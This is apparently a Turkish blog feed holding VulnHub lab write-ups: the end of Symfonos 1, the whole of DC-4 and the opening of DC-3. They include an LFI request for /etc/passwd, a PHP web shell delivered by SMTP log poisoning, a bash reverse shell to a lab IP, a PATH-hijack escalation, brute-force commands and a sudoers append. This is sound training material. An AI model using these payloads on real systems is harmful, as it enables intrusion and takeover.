Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:47:66:4F (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h39m59s, deviation: 2h53m12s, median: 2h59m59s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2020-10-03T10:36:35-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-03T15:36:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.92 seconds
</code></pre><p>Ä°lk gÃ¶ze Ã§arpan 139 ve 445 numaralÄ± portlarda Ã§alÄ±ÅŸan Samba ve 25 numaralÄ± portta Ã§alÄ±ÅŸan mail servisidir.</p>
<p>Samba servisinde paylaÅŸÄ±ma aÃ§Ä±k olan dosya ve klasÃ¶rler <em>smbclient</em> ile kontrol edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient  -L //192.168.56.114/
</code></pre></div>
    <img src="/images/vulnhub/symfonos1/smb1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Åifresiz paylaÅŸÄ±ma aÃ§Ä±k olan anonymous dizini kontrol edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient //192.168.56.114/anonymous
</code></pre></div>
    <img src="/images/vulnhub/symfonos1/smb2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>get</strong> komutu ile dosya indirilir ve iÃ§eriÄŸi gÃ¶rÃ¼ntÃ¼lenir.</p>

    <img src="/images/vulnhub/symfonos1/atten.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Zeus efendi kullanÄ±cÄ±larÄ±n aynÄ± parolalarÄ± kullanmalarÄ±ndan epeyce kÄ±zmÄ±ÅŸ anlaÅŸÄ±lan&hellip; ğŸ¤£</p>
<p>helios klasÃ¶rÃ¼ne <em>qwerty</em> parolasÄ± ile eriÅŸim saÄŸlanmaktadÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient  //192.168.56.114/helios -U helios
</code></pre></div>
    <img src="/images/vulnhub/symfonos1/smb3.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>PaylaÅŸÄ±lan dosyalar get komutu ile indirilir ve iÃ§erikleri gÃ¶rÃ¼ntÃ¼lenir. YapÄ±lacaklar adlÄ± dosyada <strong>/h3l105</strong> dizini dikkat Ã§ekmektedir.</p>

    <img src="/images/vulnhub/symfonos1/todo.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>TarayÄ±cÄ± ile web servisine istek atÄ±lÄ±r. AÃ§Ä±lan sayfada sadece bir resim vardÄ±r. Daha sonra elde edilen dizine (<code>http://symfonos.local/h3l105</code>) istek atÄ±ldÄ±ÄŸÄ±nda wordpress uygulamasÄ± karÅŸÄ±mÄ±za Ã§Ä±kmaktadÄ±r.</p>

    <img src="/images/vulnhub/symfonos1/web2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>Wpscan</strong> aracÄ± ile web sayfasÄ±nda tarama yapÄ±lÄ±r. Wordpress sÃ¼rÃ¼mÃ¼, sistemdeki kullanÄ±cÄ±lar vb. bir Ã§ok bilgi tespit edilir. Upload klasÃ¶rÃ¼nÃ¼n eriÅŸime aÃ§Ä±k olduÄŸu bilgisi dikkat Ã§ekmektedir.</p>

    <img src="/images/vulnhub/symfonos1/wpscan.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Uploads klasÃ¶rÃ¼ne girildiÄŸinde <strong>siteeditor</strong> adÄ±nda klasÃ¶r gÃ¶rÃ¼lmektedir. YapÄ±lan araÅŸtÄ±rma wordpress plugin olduÄŸu ve uygulamaya ait <em>LFI</em> aÃ§Ä±ÄŸÄ± olduÄŸu tespit edilmektedir.</p>

    <img src="/images/vulnhub/symfonos1/expdb.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Exploit detaylarÄ±na bakÄ±ldÄ±ÄŸÄ±nda lfi zafiyetinin olduÄŸu dizin ve parametreler aÅŸaÄŸÄ±da gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/vulnhub/symfonos1/expdb2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>/etc/passwd dosyasÄ±nÄ± okunmaya Ã§alÄ±ÅŸÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
</code></pre></div><p>
    <img src="/images/vulnhub/symfonos1/lfi.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


Bu aÅŸamadan sonra mail servisinde keÅŸif yapÄ±lÄ±r. smtp-user-enum aracÄ± ile helios kullanÄ±cÄ±sÄ± doÄŸrulamasÄ± gerÃ§ekleÅŸtirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smtp-user-enum -u helios -t 192.168.56.114
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Target count ............. 1
Username count ........... 1
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sat Oct  3 08:13:56 2020 #########
192.168.56.114: helios exists
######## Scan completed at Sat Oct  3 08:13:56 2020 #########
1 results.

1 queries in 1 seconds (1.0 queries / sec)
</code></pre><p><strong>Helios</strong> kullanÄ±cÄ±sÄ±na mail servisinden zararlÄ± kodun bulunduÄŸu bir mail gÃ¶nderilir. LFI ile mail okunarak zararlÄ± kod Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.</p>
<p>Ä°lk olarak <strong>nc</strong> veya <strong>telnet</strong> ile smtp servisine baÄŸlanÄ±lÄ±r.</p>
<pre><code class="language-terminal" data-lang="terminal">nc 192.168.56.114 25
</code></pre><pre><code>**En Ã¶nemli SMTP komutlarÄ± aÅŸaÄŸÄ±daki gibidir.

HELP: Komutlar listelenir.
HELO: SMTP sunucusu ile SMTP iletiÅŸimi baÅŸlatÄ±lÄ±r.
EHLO: GeniÅŸletilmiÅŸ SMTP iletiÅŸimi iÃ§in kullanÄ±lÄ±r.
AUTH: Ä°stemcinin kimlik doÄŸrulamasÄ± iÃ§in kullanÄ±lÄ±r.
MAIL FROM: E-posta gÃ¶ndericisi belirtilir.
RCPT TO: E-posta alÄ±cÄ±sÄ± belirtilir.
DATA: E-postanÄ±n iÃ§eriÄŸi belirtilir. E-posta iÃ§eriÄŸi, â€œ.â€ ifadesi iÃ§eren satÄ±r ile tamamlanmÄ±ÅŸ olur.
SUBJECT: E-postanÄ±n konusu belirtilir.
QUIT: Oturum sonlandÄ±rÄ±lÄ±r.
VRFY: E-posta kutusu alÄ±cÄ±sÄ± doÄŸrulanÄ±r.
EXPN: E-posta listesi doÄŸrulanÄ±r.
STARTTLS: SMTP iletiÅŸimi TLS Ã¼zerinden baÅŸlatÄ±lÄ±r.
RSET: E-posta iletiÅŸimi kesilir.
</code></pre>
<p>YukarÄ±daki komutlar Ã§erÃ§evesinde root kullanÄ±cÄ±sÄ±ndan helios kullanÄ±cÄ±sÄ±na cmd parametresi ile gÃ¶nderilen komutun Ã§alÄ±ÅŸtÄ±rÄ±labileceÄŸi php kodu gÃ¶nderilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">system</span>($_REQUEST[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span>
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">â”€[barcode@parrot]â”€[~]$ nc 192.168.56.114 25
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
helo symfonos@localdomain
250 symfonos.localdomain
mail from:root@symfonos.localdomain
250 2.1.0 Ok
rcpt to:helios@symfonos.localdomain
250 2.1.5 Ok
data
354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
&lt;?php echo system($_REQUEST[&quot;cmd&quot;]); ?&gt;
.
250 2.0.0 Ok: queued as D547140698
</code></pre><p>TarayÄ±cÄ±ndan <em>/var/mail/</em> dizini altÄ±nda helios kullanÄ±cÄ±sÄ±nÄ±n maillerinin tutulduÄŸu helios dosyasÄ± okunarak zararlÄ± kod Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. Ä°lk olarak <em><strong>cmd=ls -l</strong></em> test edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">../ajax_shortcode_pattern.php?ajax_path=/var/mail/helios<span style="color:#960050;background-color:#1e0010">&amp;</span>cmd=ls -l
</code></pre></div>
    <img src="/images/vulnhub/symfonos1/lfi2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p><code>cmd=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.105/4444 0&gt;&amp;1'</code> ÅŸeklinde istek atÄ±larak  4444 numaralÄ± porttan <strong>helios</strong> kullanÄ±cÄ±sÄ± yetkisi ile terminal baÄŸlantÄ±sÄ± saÄŸlanÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">../ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&amp;cmd=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.105/4444 0&gt;&amp;1&#39;
</code></pre></div><h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Python pty modÃ¼lÃ¼ kullanÄ±larak etkileÅŸimli kabuÄŸa geÃ§ilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><p>Ä°lk olarak <code>sudo -l</code> komutu Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, komut bulunamadÄ± hatasÄ± ile karÅŸÄ±laÅŸÄ±lÄ±r. Sistem de suid biti aktif dosyalar iÃ§in araÅŸtÄ±rma yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
</code></pre></div>
    <img src="/images/vulnhub/symfonos1/suid.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>/opt dizini altÄ±nda yer alan <strong>statuscheck</strong> adlÄ± uygulama dikkat Ã§ekmektedir. Dosya sahibinin root olduÄŸu gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/vulnhub/symfonos1/own.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Uygulama Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda apache sunucusuna istek atÄ±ldÄ±ÄŸÄ± dÃ¶nen paketin header bilgisinin ekrana basÄ±ldÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir. Strings aracÄ± ile uygulama iÃ§erisinde yer alan string ifadeler Ã§Ä±karÄ±lÄ±r.</p>

    <img src="/images/vulnhub/symfonos1/content.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Curl komutu ile localhosta istek atÄ±ldÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir. AyrÄ±ca curl komutu iÃ§in tam path verilmemiÅŸtir. Bu kapsamda;</p>
<ol>
<li><em>/home/helios</em> dizininde curl adÄ±nda bir dosya oluÅŸturulur.</li>
<li><em><strong>curl</strong></em> dosyasÄ± iÃ§erisine shell oturumu iÃ§in kodlar eklenir.</li>
<li><strong>PATH</strong> deÄŸiÅŸkeninin baÅŸÄ±na curl dosya pathi eklenir.</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;/bin/sh&#34;</span> &gt; curl
export PATH<span style="color:#f92672">=</span>/home/helios:$PATH
/opt/statuscheck
</code></pre></div><p>Dosya Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda root yetkisi ile oturum elde edilir.</p>

    <img src="/images/vulnhub/symfonos1/priv.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Proof.txt okunarak makina Ã§Ã¶zÃ¼mleri tamamlanÄ±r.</p>

    <img src="/images/vulnhub/symfonos1/flag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB DC-4 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/10/vulnhub-dc-4-write-up/</link>
            <pubDate>Sat, 03 Oct 2020 13:30:54 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/10/vulnhub-dc-4-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere VULNHUB &amp;lsquo;da yer alan DC-4 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&amp;hellip; ğŸ˜Š
1. KeÅŸif AÅŸamasÄ± Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.
netdiscover -i eth1  Nmap ile tÃ¼m portlar ve aÃ§Ä±k olan portlarda Ã§alÄ±ÅŸan servisler tespit edilir.
sudo nmap -sV -sC -p- 192.168.56.113  80 portunda Ã§alÄ±ÅŸan web servisine tarayÄ±cÄ±ndan istek atÄ±lÄ±r.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazÄ±mda sizlere <a href="https://www.vulnhub.com/entry/dc-4,313/">VULNHUB</a> &lsquo;da yer alan DC-4 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&hellip; ğŸ˜Š</p>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/dc4/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Nmap ile tÃ¼m portlar ve aÃ§Ä±k olan portlarda Ã§alÄ±ÅŸan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.113
</code></pre></div>
    <img src="/images/vulnhub/dc4/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>80 portunda Ã§alÄ±ÅŸan web servisine tarayÄ±cÄ±ndan istek atÄ±lÄ±r.</p>

    <img src="/images/vulnhub/dc4/web.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Web dizin taramasÄ± yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.113 -w /usr/share/wordlists/dirb/big.txt -x php,txt
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.113
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php
[+] Timeout:        10s
===============================================================
2020/10/02 08:33:12 Starting gobuster
===============================================================
/command.php (Status: 302)
/css (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/login.php (Status: 302)
/logout.php (Status: 302)
===============================================================
2020/10/02 08:33:26 Finished
===============================================================
</code></pre><p>Index.php sayfasÄ±nÄ±n login.php sayfasÄ±na yÃ¶nlendirilmiÅŸtir. Sqlmap ile login sayfasÄ±nda Sql Injection aÃ§Ä±ÄŸÄ± iÃ§in kontrol edildiÄŸinde herhangi bir zafiyet gÃ¶rÃ¼lmektedir. Login sayfasÄ±na admin kullanÄ±cÄ±sÄ± iÃ§in brute-force saldÄ±rÄ±sÄ± yapÄ±lÄ±r. Admin kullanÄ±cÄ±sÄ± iÃ§in happy parola bilgisi elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wfuzz -c -z file,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt --hs incorrect -d <span style="color:#e6db74">&#34;username=admin&amp;password=FUZZ&#34;</span> http://192.168.56.113/login.php
</code></pre></div>
    <img src="/images/vulnhub/dc4/force.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Admin kullanÄ±cÄ±sÄ± ile giriÅŸ yapÄ±lÄ±r.</p>

    <img src="/images/vulnhub/dc4/admin.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Command sayfasÄ±na giriÅŸ yapÄ±lÄ±r.</p>

    <img src="/images/vulnhub/dc4/commandpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Burpsuite aracÄ± ile giden istekler incelenir. Ä°stek gÃ¶nderilirken boÅŸluk karakteri + ile kodlanmaktadÄ±r. wget aracÄ± ile shell alÄ±ncak dosya yÃ¼klenir. Ancak dizine yazma yetkisi sadece root kullanÄ±cÄ±sÄ±na ait olduÄŸundan baÅŸarÄ±sÄ±z olunur.</p>

    <img src="/images/vulnhub/dc4/bp1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>ls</strong> komutu ile dizinlerde gezinilerek keÅŸif yapÄ±lÄ±r. jim kullanÄ±cÄ±sÄ±nÄ±n home dizini altÄ±nda bir parola listesi bulunur.</p>

    <img src="/images/vulnhub/dc4/bp2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>cat</strong> komutu ile liste gÃ¶rÃ¼ntÃ¼lenir ve localhost&rsquo;a ssh servisine yapÄ±lacak olan brute force saldÄ±rÄ±sÄ± iÃ§in kayÄ±t edilir.</p>

    <img src="/images/vulnhub/dc4/bp3.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Tespit edilen kullanÄ±cÄ±lardan wordlist oluÅŸturularak ve hydra aracÄ± ile ssh servisine brute force saldÄ±rÄ±sÄ± yapÄ±lÄ±r.</p>

    <img src="/images/vulnhub/dc4/bp4.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hydra -L user.lst -P pass.lst ssh://192.168.56.113
</code></pre></div>
    <img src="/images/vulnhub/dc4/hydra.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>Elde edilen bilgiler ile ssh baÄŸlantÄ±sÄ± yapÄ±lÄ±r. <code>Sudo -l</code> komutu girildiÄŸinde parola istenmektedir. Parola rastgele girildiÄŸinde hatalÄ± deneme kullanÄ±cÄ±ya mail olarak gÃ¶nderilmektedir. <em>/var/mail/</em> dizini altÄ±nda yer alan jim dosyasÄ± okunarak kullanÄ±cÄ± mail kutusu kontrol edilir. Charles kullanÄ±cÄ±sÄ±ndan gelen bir mailde parola bilgisi yer almaktadÄ±r. Charles kullanÄ±cÄ±sÄ±na geÃ§iÅŸ yapÄ±lÄ±r.</p>

    <img src="/images/vulnhub/dc4/charlesmail.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Charles kullanÄ±cÄ±sÄ±na ait sudo yetkileri kontrol edilir.</p>

    <img src="/images/vulnhub/dc4/sudo.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>Teehee</strong> adlÄ± uygulamanÄ±n root yetkisi ile kullanÄ±labileceÄŸi tespit edilir. UygulamanÄ±n iÃ§eriÄŸine bakÄ±lÄ±r. UygulamanÄ±n tee uygulamasÄ± ile aynÄ± olduÄŸu gÃ¶rÃ¼lÃ¼r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strings /usr/bin/teehee
</code></pre></div>
    <img src="/images/vulnhub/dc4/tee.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>tee</strong> uygulamasÄ± kendisine gÃ¶nderilen Ã§Ä±ktÄ±yÄ± hem dosyaya hemde standart Ã§Ä±kÄ±ÅŸ olan terminal ekranÄ±na basar. Sudoers dosyasÄ±na charles kullanÄ±cÄ±sÄ±nÄ±n tÃ¼m komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmasÄ± iÃ§in dÃ¼zenlenme yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;charles ALL=(ALL) ALL&#34;</span> | sudo teehee -a /etc/sudoers
</code></pre></div><p><code>Sudo su</code> ile root kullanÄ±cÄ±sÄ±na geÃ§ilerek <em>/root</em> dizininde yer alan flag deÄŸeri okunur.</p>

    <img src="/images/vulnhub/dc4/rootflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB DC-3 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vulnhub-dc-3-write-up/</link>
            <pubDate>Tue, 29 Sep 2020 13:06:24 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vulnhub-dc-3-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere VULNHUB &amp;lsquo;da yer alan DC-3 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&amp;hellip; ğŸ˜Š
1. KeÅŸif AÅŸamasÄ± Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.
netdiscover -i eth1  Nmap ile tÃ¼m portlar ve aÃ§Ä±k olan portlarda Ã§alÄ±ÅŸan servisler tespit edilir.
sudo nmap -sV -sC -p- 192.168.56.111  80 portunda Ã§alÄ±ÅŸan web servisine tarayÄ±cÄ±ndan istek atÄ±lÄ±r.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazÄ±mda sizlere <a href="https://www.vulnhub.com/entry/dc-32,312/">VULNHUB</a> &lsquo;da yer alan DC-3 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&hellip; ğŸ˜Š</p>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/dc3/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Nmap ile tÃ¼m portlar ve aÃ§Ä±k olan portlarda Ã§alÄ±ÅŸan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.111
</code></pre></div>
    <img src="/images/vulnhub/dc3/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>80 portunda Ã§alÄ±ÅŸan web servisine tarayÄ±cÄ±ndan istek atÄ±lÄ±r. Sayfa kaynak kodu incelendiÄŸinde Joomla CMS uygulamasÄ±nÄ±n Ã§alÄ±ÅŸtÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/vulnhub/dc3/web.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Web dizin taramasÄ± gerÃ§ekleÅŸtirilir. AyrÄ±ca google&rsquo;da arama yapÄ±ldÄ±ÄŸÄ±nda <em><strong>administrator/manifests/files/joomla.xml</strong></em> iÃ§erisnde uygulama sÃ¼rÃ¼mÃ¼ hakkÄ±nda bilgi yer aldÄ±ÄŸÄ± tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.111 -w /usr/share/wordlists/dirb/big.txt
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.111
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
